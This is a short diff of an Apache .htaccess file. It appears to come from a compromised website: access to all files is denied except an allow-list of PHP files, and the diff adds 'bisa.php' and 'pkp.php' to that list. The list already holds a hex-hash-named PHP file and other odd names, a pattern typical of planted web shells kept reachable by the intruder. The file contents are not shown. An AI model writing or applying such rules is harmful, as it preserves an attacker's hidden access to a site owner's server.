@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|error.php|defines.php|loader.php|framework.php|helper.php|tmpl.php|8be87da8e2ae0e88f3b1a0aacb24db803f26424c.php|InvalidOptions.php|class-wp-application-passwords-list-options.php)$">
+<FilesMatch "^(index.php|bisa.php|pkp.php|error.php|defines.php|loader.php|framework.php|helper.php|tmpl.php|8be87da8e2ae0e88f3b1a0aacb24db803f26424c.php|InvalidOptions.php|class-wp-application-passwords-list-options.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
